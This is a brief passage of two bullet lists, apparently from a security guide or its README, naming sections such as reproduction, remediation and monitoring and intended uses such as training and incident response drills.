- Step-by-step reproduction
- Expected outcomes
- Remediation procedures
- Monitoring & verification

Ready for:
- Security team training
- Incident response drills
- Compliance audits
- Production deployment
